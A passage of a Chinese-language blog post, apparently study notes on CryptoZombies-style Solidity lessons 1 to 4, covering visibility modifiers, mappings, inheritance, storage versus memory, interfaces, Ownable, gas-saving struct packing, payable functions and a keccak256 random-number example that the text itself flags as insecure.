class="code"><pre><span class="line">&#x2F;&#x2F; 创建一个新的Person:</span><br><span class="line">Person satoshi &#x3D; Person(172, &quot;Satoshi&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将新创建的satoshi添加进people数组:</span><br><span class="line">people.push(satoshi);</span><br></pre></td></tr></table></figure> 当然我们也可以采取更简洁的写法： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">people.push(Person(16, &quot;Vitalik&quot;));</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>私有 / 公共函数</strong><br>  Solidity 定义的函数的属性<strong>默认</strong>为公共。 这就意味着任何一方 (或其它合约) 都可以调用你合约里的函数<br/><br>  显然，不是什么时候都需要这样，而且这样的合约易于受到攻击。 所以将自己的函数定义为私有是一个好的编程习惯，只有当你需要外部世界调用它时才将它设置为公共。</p><p>  <b>如何定义一个私有的函数呢？</b></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uint[] numbers;</span><br><span class="line"></span><br><span class="line">function _addToArray(uint _number) private &#123;</span><br><span class="line">numbers.push(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  在给函数添加上<code>private</code>修饰符后，意味着只有我们合约中的其它函数才能够调用这个函数，给 numbers 数组添加新成员。</p></li><li><strong>返回值</strong><br>  要想函数返回一个数值，按如下定义：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string greeting &#x3D; &quot;What&#39;s up bro?&quot;;</span><br><span class="line"></span><br><span class="line">function sayHello() public returns (string) &#123;</span><br><span class="line">return greeting;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>函数修饰符</strong></p><blockquote><p>Solidity 语言有两类和状态读写有关的函数类型，一类是 view 函数（也称为视图函数），另一类是 pure 函数（也称为纯函数）。他们的区别是 view 函数不修改状态，pure 函数即不修改状态也不读取状态。</p></blockquote><p>  调用这两种函数时，均不消耗gas。因此我们称view和pure是节约gas的利器。</p><ul><li><p><strong>view</strong></p><blockquote><p>可以将函数声明为 view 函数类型，这种情况下函数保证不修改状态。</p></blockquote><p>  constant 曾经是 view 的别名，但在0.5.0版本中删除了这一点。<br><br/></p></li><li><strong>pure</strong><blockquote><p>在保证不读取或修改状态的情况下，函数可以被声明为 pure 函数。特别是，在编译时只给出函数输入和msg.data ，但又不知道当前区块链状态的情况下，建议使用 pure 函数。这意味着对 immutable 变量的读取可以是非纯操作。</p></blockquote></li></ul></li><li><p><strong>类型转换</strong><br>  有时你需要变换数据类型。例如:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint8 a &#x3D; 5;</span><br><span class="line">uint b &#x3D; 6;</span><br><span class="line">&#x2F;&#x2F; 将会抛出错误，因为 a * b 返回 uint, 而不是 uint8:</span><br><span class="line">uint8 c &#x3D; a * b;</span><br><span class="line">&#x2F;&#x2F; 我们需要将 b 转换为 uint8:</span><br><span class="line">uint8 c &#x3D; a * uint8(b);</span><br></pre></td></tr></table></figure><p>  上面, a * b 返回类型是 uint, 但是当我们尝试用 uint8 类型接收时, 就会造成潜在的错误。如果把它的数据类型转换为 uint8, 就可以了，编译器也不会出错。</p></li><li><p><strong>事件</strong><br>  事件 是合约和区块链通讯的一种机制。你的前端应用“监听”某些事件，并做出反应。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 这里建立事件</span><br><span class="line">event IntegersAdded(uint x, uint y, uint result);</span><br><span class="line"></span><br><span class="line">function add(uint _x, uint _y) public &#123;</span><br><span class="line">uint result &#x3D; _x + _y;</span><br><span class="line">&#x2F;&#x2F;触发事件，通知app</span><br><span class="line">IntegersAdded(_x, _y, result);</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  你的 dapp 前端可以监听到这个事件。JavaScript 实现如下:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">YourContract.IntegersAdded(function(error, result) &#123;</span><br><span class="line">&#x2F;&#x2F; dosome</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h2><ul><li><p>映射（Mapping）和地址（Address）<br> 我们通过给数据库中的僵尸指定“主人”， 来支持“多玩家”模式。</p><p> 如此一来，我们需要引入2个新的数据类型：mapping（映射） 和 address（地址）。</p><ul><li><p>Address<br>以太坊区块链由 <em> account </em> (账户)组成，你可以把它想象成银行账户。每个帐户都有一个“地址”，你可以把它想象成银行账号。这是账户唯一的标识符，它看起来长这样：<br><code>0x0cE446255506E92DF41614C46F1d6df9Cc969183</code></p></li><li><p>Mapping<br>  <code>Mapping</code>是另一种在 Solidity 中存储有组织数据的方法。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对于金融应用程序，将用户的余额保存在一个 uint类型的变量中：</span><br><span class="line">mapping (address &#x3D;&gt; uint) public accountBalance;</span><br><span class="line">&#x2F;&#x2F;或者可以用来通过userId 存储&#x2F;查找的用户名</span><br><span class="line">mapping (uint &#x3D;&gt; string) userIdToName;</span><br></pre></td></tr></table></figure><p>  映射本质上是存储和查找数据所用的键-值对。在第一个例子中，键是一个 address，值是一个 uint，在第二个例子中，键是一个uint，值是一个 string。<br><br/></p></li></ul></li><li>Msg.sender<br>  在 Solidity 中，有一些全局变量可以被所有函数调用。 其中一个就是 msg.sender，它指的是当前调用者（或智能合约）的 address。<blockquote><p>在 Solidity 中，功能执行始终需要从外部调用者开始。 一个合约只会在区块链上什么也不做，除非有人调用其中的函数。所以 msg.sender总是存在的。<br><br/></p></blockquote></li><li>Require<br> <code>require()</code>语句用于判断某个条件是否满足，若不满足括号里的条件，函数将直接返回，类似于<code>break</code><br> 在调用一个函数之前，用 require 验证前置条件是非常有必要的。<br><br/></li><li>继承<br>  有个让 Solidity 的代码易于管理的功能，就是合约 inheritance (继承)：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Doge &#123;</span><br><span class="line">function catchphrase() public returns (string) &#123;</span><br><span class="line">    return &quot;So Wow CryptoDoge&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BabyDoge is Doge &#123;</span><br><span class="line">function anotherCatchphrase() public returns (string) &#123;</span><br><span class="line">    return &quot;Such Moon BabyDoge&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  由于 <code>BabyDoge</code> 是从 <code>Doge</code> 那里继承过来的。 这意味着当你编译和部署了 <code>BabyDoge</code>，它将可以访问 <code>catchphrase()</code> 和 <code>anotherCatchphrase()</code>和其他我们在 <code>Doge</code> 中定义的其他公共函数。<br/><br>  这可以用于逻辑继承（比如表达子类的时候，Cat 是一种 Animal）。 但也可以简单地将类似的逻辑组合到不同的合约中以组织代码。<br><br/></li><li>Storage与Memory<br>  在 Solidity 中，有两个地方可以存储变量 —— <code>storage</code> 或 <code>memory</code>。<br/><br>  Storage 变量是指永久存储在区块链中的变量。 Memory 变量则是临时的，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是RAM中数据的关系。<blockquote><p>大多数时候你都用不到这些关键字，默认情况下 Solidity 会自动处理它们。 也有一些情况下，你需要手动声明存储类型，主要用于处理函数内的 <em> 结构体 </em> 和 <em> 数组 </em> 时：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract SandwichFactory &#123;</span><br><span class="line">struct Sandwich &#123;</span><br><span class="line">    string name;</span><br><span class="line">    string status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sandwich[] sandwiches;</span><br><span class="line"></span><br><span class="line">function eatSandwich(uint _index) public &#123;</span><br><span class="line">    &#x2F;&#x2F; Sandwich mySandwich &#x3D; sandwiches[_index];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ^ 看上去很直接，不过 Solidity 将会给出警告</span><br><span class="line">    &#x2F;&#x2F; 告诉你应该明确在这里定义 &#96;storage&#96; 或者 &#96;memory&#96;。</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 所以你应该明确定义 &#96;storage&#96;:</span><br><span class="line">    Sandwich storage mySandwich &#x3D; sandwiches[_index];</span><br><span class="line">    &#x2F;&#x2F; ...这样 &#96;mySandwich&#96; 是指向 &#96;sandwiches[_index]&#96;的指针</span><br><span class="line">    &#x2F;&#x2F; 在存储里，另外...</span><br><span class="line">    mySandwich.status &#x3D; &quot;Eaten!&quot;;</span><br><span class="line">    &#x2F;&#x2F; ...这将永久把 &#96;sandwiches[_index]&#96; 变为区块链上的存储</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果你只想要一个副本，可以使用&#96;memory&#96;:</span><br><span class="line">    Sandwich memory anotherSandwich &#x3D; sandwiches[_index + 1];</span><br><span class="line">    &#x2F;&#x2F; ...这样 &#96;anotherSandwich&#96; 就仅仅是一个内存里的副本了</span><br><span class="line">    &#x2F;&#x2F; 另外</span><br><span class="line">    anotherSandwich.status &#x3D; &quot;Eaten!&quot;;</span><br><span class="line">    &#x2F;&#x2F; ...将仅仅修改临时变量，对 &#96;sandwiches[_index + 1]&#96; 没有任何影响</span><br><span class="line">    &#x2F;&#x2F; 不过你可以这样做:</span><br><span class="line">    sandwiches[_index + 1] &#x3D; anotherSandwich;</span><br><span class="line">    &#x2F;&#x2F; ...如果你想把副本的改动保存回区块链存储</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>internal 和 external<br>  除 <code>public</code> 和 <code>private</code> 属性之外，Solidity 还使用了另外两个描述函数可见性的修饰词：<code>internal</code>（内部） 和 <code>external</code>（外部）。</p><ul><li>internal<br>  internal 和 private 类似，不过， 如果某个合约继承自其父合约，这个合约即可以访问父合约中定义的“内部”函数。</li><li>external<br>  external 与public 类似，只不过这些函数只能在合约之外调用 - 它们不能被合约内的其他函数调用。<br><br/></li></ul></li><li><p><strong>与其他合约交互</strong></p><ol><li>定义接口<br> 假设在区块链上有这么一个合约： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract LuckyNumber &#123;</span><br><span class="line">mapping(address &#x3D;&gt; uint) numbers;</span><br><span class="line"></span><br><span class="line">function setNum(uint _num) public &#123;</span><br><span class="line">    numbers[msg.sender] &#x3D; _num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getNum(address _myAddress) public view returns (uint) &#123;</span><br><span class="line">    return numbers[_myAddress];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 这是个很简单的合约，您可以用它存储自己的幸运号码，并将其与您的以太坊地址关联。 这样其他人就可以通过您的地址查找您的幸运号码了。<br/><br> 现在假设我们有一个外部合约，使用 getNum 函数可读取其中的数据。<blockquote><p>首先，我们定义 LuckyNumber 合约的 interface ：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract NumberInterface &#123;</span><br><span class="line">function getNum(address _myAddress) public view returns (uint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 请注意，这个过程虽然看起来像在定义一个合约，但其实内里不同.<br/><br> 首先，我们只声明了要与之交互的函数 —— 在本例中为 getNum —— 在其中我们没有使用到任何其他的函数或状态变量。<br> 其次，我们并没有使用大括号（{ 和 }）定义函数体，我们单单用分号（;）结束了函数声明。这使它看起来像一个合约框架。<br/><br> 编译器就是靠这些特征认出它是一个接口的。</p></blockquote></li><li>实现接口<br> 我们可以在合约中这样使用： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract &#123;</span><br><span class="line">address NumberInterfaceAddress &#x3D; 0xab38...;</span><br><span class="line">&#x2F;&#x2F; ^ 这是FavoriteNumber合约在以太坊上的地址</span><br><span class="line">NumberInterface numberContract &#x3D; NumberInterface(NumberInterfaceAddress);</span><br><span class="line">&#x2F;&#x2F; 现在变量 &#96;numberContract&#96; 指向另一个合约对象</span><br><span class="line"></span><br><span class="line">function someFunction() public &#123;</span><br><span class="line">    &#x2F;&#x2F; 现在我们可以调用在那个合约中声明的 &#96;getNum&#96;函数:</span><br><span class="line">    uint num &#x3D; numberContract.getNum(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; ...在这儿使用 &#96;num&#96;变量做些什么</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 通过这种方式，只要将您合约的可见性设置为public(公共)或external(外部)，它们就可以与以太坊区块链上的任何其他合约进行交互。</li></ol></li><li>处理多返回值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function multipleReturns() internal returns(uint a, uint b, uint c) &#123;</span><br><span class="line">return (1, 2, 3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function processMultipleReturns() external &#123;</span><br><span class="line">uint a;</span><br><span class="line">uint b;</span><br><span class="line">uint c;</span><br><span class="line">&#x2F;&#x2F; 这样来做批量赋值:</span><br><span class="line">(a, b, c) &#x3D; multipleReturns();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 或者如果我们只想返回其中一个变量:</span><br><span class="line">function getLastReturnValue() external &#123;</span><br><span class="line">uint c;</span><br><span class="line">&#x2F;&#x2F; 可以对其他字段留空:</span><br><span class="line">(,,c) &#x3D; multipleReturns();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h2></li><li><p><strong>Ownable Contracts</strong><br>  指定合约的“所有权” - 就是说，给它指定一个主人（没错，就是您），只有主人对它享有特权。</p><ul><li>OpenZeppelin库的Ownable 合约<br>  下面是一个 Ownable 合约的例子： 来自 <em> OpenZeppelin </em> Solidity 库的 Ownable 合约。   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">* @title Ownable</span><br><span class="line">* @dev The Ownable contract has an owner address, and provides basic authorization control</span><br><span class="line">* functions, this simplifies the implementation of &quot;user permissions&quot;.</span><br><span class="line">*&#x2F;</span><br><span class="line">contract Ownable &#123;</span><br><span class="line">address public owner;</span><br><span class="line">event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">* @dev The Ownable constructor sets the original &#96;owner&#96; of the contract to the sender</span><br><span class="line">* account.</span><br><span class="line">*&#x2F;</span><br><span class="line">function Ownable() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">* @dev Throws if called by any account other than the owner.</span><br><span class="line">*&#x2F;</span><br><span class="line">modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">* @dev Allows the current owner to transfer control of the contract to a newOwner.</span><br><span class="line">* @param newOwner The address to transfer ownership to.</span><br><span class="line">*&#x2F;</span><br><span class="line">function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner !&#x3D; address(0));</span><br><span class="line">    OwnershipTransferred(owner, newOwner);</span><br><span class="line">    owner &#x3D; newOwner;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  函数修饰符：modifier onlyOwner()。 修饰符跟函数很类似，不过是用来修饰其他已有函数用的， 在其他语句执行前，为它检查下先验条件。 在这个例子中，我们就可以写个修饰符 onlyOwner 检查下调用者，确保只有合约的主人才能运行本函数。我们下一章中会详细讲述修饰符，以及那个奇怪的_;。<blockquote><p>所以Ownable 合约基本都会这么干：<br>  1.合约创建，构造函数先行，将其 owner 设置为msg.sender（其部署者）<br>  2.为它加上一个修饰符 onlyOwner，它会限制陌生人的访问，将访问某些函数的权限锁定在 owner 上。<br>  3.允许将合约所有权转让给他人。<br><br/></p></blockquote></li></ul></li><li><p><strong>onlyOwner 函数修饰符</strong><br>  我们仔细读读 <code>onlyOwner</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner() &#123;</span><br><span class="line">require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <code>onlyOwner</code> 函数修饰符是这么用的：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract is Ownable &#123;</span><br><span class="line">event LaughManiacally(string laughter);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;注意！ &#96;onlyOwner&#96;上场 :</span><br><span class="line">function likeABoss() external onlyOwner &#123;</span><br><span class="line">    LaughManiacally(&quot;Muahahahaha&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  注意 likeABoss 函数上的 onlyOwner 修饰符。 当你调用 likeABoss 时，首先执行 onlyOwner 中的代码， 执行到 onlyOwner 中的 _; 语句时，程序再返回并执行 likeABoss 中的代码。</p><p>  可见，尽管函数修饰符也可以应用到各种场合，但最常见的还是放在函数执行之前添加快速的 require检查<br><br/></p></li><li><p><strong>省 gas 的招数：结构封装 （Struct packing）</strong><br>  通常情况下我们不会考虑使用 uint 变种，因为无论如何定义 uint的大小，Solidity 为它保留256位的存储空间。例如，使用 uint8 而不是uint（uint256）不会为你节省任何 gas.  <br/><br>  除非，把 uint 绑定到 struct 里面。<br>  如果一个 struct 中有多个 uint，则尽可能使用较小的 uint, Solidity 会将这些 uint 打包在一起，从而占用较少的存储空间。例如：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct NormalStruct &#123;</span><br><span class="line">uint a;</span><br><span class="line">uint b;</span><br><span class="line">uint c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct MiniMe &#123;</span><br><span class="line">uint32 a;</span><br><span class="line">uint32 b;</span><br><span class="line">uint c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 因为使用了结构打包，&#96;mini&#96; 比 &#96;normal&#96; 占用的空间更少</span><br><span class="line">NormalStruct normal &#x3D; NormalStruct(10, 20, 30);</span><br><span class="line">MiniMe mini &#x3D; MiniMe(10, 20, 30);</span><br></pre></td></tr></table></figure><p><br/></p></li><li><p><strong>时间单位</strong><br>  Solidity 使用自己的本地时间单位。<br>  变量 now 将返回当前的unix时间戳（自1970年1月1日以来经过的秒数）。</p><blockquote><p>Solidity 还包含秒(seconds)，分钟(minutes)，小时(hours)，天(days)，周(weeks) 和 年(years) 等时间单位。它们都会转换成对应的秒数放入 uint 中。所以 1分钟 就是 60，1小时是 3600（60秒×60分钟），1天是86400（24小时×60分钟×60秒），以此类推。</p></blockquote><p>  下面是一些使用时间单位的实用案例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint lastUpdated;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将‘上次更新时间’ 设置为 ‘现在’</span><br><span class="line">function updateTimestamp() public &#123;</span><br><span class="line">lastUpdated &#x3D; now;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果到上次&#96;updateTimestamp&#96; 超过5分钟，返回 &#39;true&#39;</span><br><span class="line">&#x2F;&#x2F; 不到5分钟返回 &#39;false&#39;</span><br><span class="line">function fiveMinutesHavePassed() public view returns (bool) &#123;</span><br><span class="line">return (now &gt;&#x3D; (lastUpdated + 5 minutes));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br/></p></li><li><p><strong>带参数的函数修饰符</strong><br>  之前我们已经读过一个简单的函数修饰符了：onlyOwner。函数修饰符也可以带参数。例如：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 存储用户年龄的映射</span><br><span class="line">mapping (uint &#x3D;&gt; uint) public age;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 限定用户年龄的修饰符</span><br><span class="line">modifier olderThan(uint _age, uint _userId) &#123;</span><br><span class="line">require(age[_userId] &gt;&#x3D; _age);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 必须年满16周岁才允许开车 (至少在美国是这样的).</span><br><span class="line">&#x2F;&#x2F; 我们可以用如下参数调用&#96;olderThan&#96; 修饰符:</span><br><span class="line">function driveCar(uint _userId) public olderThan(16, _userId) &#123;</span><br><span class="line">&#x2F;&#x2F; 其余的程序逻辑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这表明我们其实可以自己创建一个属于自己合约的修饰符函数，进而实现方法调用的控制。<br><br/></p></li></ul><h2 id="Lesson-4"><a href="#Lesson-4" class="headerlink" title="Lesson 4"></a>Lesson 4</h2><ul><li><p><strong>可支付（payable）修饰符</strong><br>  <code>payable</code> 方法是让 Solidity 和以太坊变得如此酷的一部分 —— 它们是一种可以接收以太的特殊函数。<br>  一个栗子：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract OnlineStore &#123;</span><br><span class="line">function buySomething() external payable &#123;</span><br><span class="line">    &#x2F;&#x2F; 检查以确定0.001以太发送出去来运行函数:</span><br><span class="line">    require(msg.value &#x3D;&#x3D; 0.001 ether);</span><br><span class="line">    &#x2F;&#x2F; 如果为真，一些用来向函数调用者发送数字内容的逻辑</span><br><span class="line">    transferThing(msg.sender);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  在这里，msg.value 是一种可以查看向合约发送了多少以太的方法，另外 ether 是一个內建单元。<br><br/></p></li><li><p><strong>随机数</strong><br>  Solidity 中最好的随机数生成器是 <code>keccak256</code> 哈希函数.<br>  我们可以这样来生成一些随机数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 生成一个0到100的随机数:</span><br><span class="line">uint randNonce &#x3D; 0;</span><br><span class="line">uint random &#x3D; uint(keccak256(now, msg.sender, randNonce)) % 100;</span><br><span class="line">randNonce++;</span><br><span class="line">uint random2 &#x3D; uint(keccak256(now, msg.sender, randNonce)) % 100;</span><br></pre></td></tr></table></figure><p>  这个方法首先拿到 now 的时间戳、 msg.sender、 以及一个自增数 nonce （一个仅会被使用一次的数，这样我们就不会对相同的输入值调用一次以上哈希函数了）。<br/><br>  然后利用 keccak 把输入的值转变为一个哈希值, 再将哈希值转换为 uint, 然后利用 % 100 来取最后两位, 就生成了一个0到100之间随机数了。</p><blockquote><p>这个方法其实并不安全，很容易受到不诚实的节点攻击，但同时，攻击的代价也是很大的。<br>  关于安全的随机数生成可以查看这个<a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract" target="_blank" rel="noopener">StackOverFlow上的讨论</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
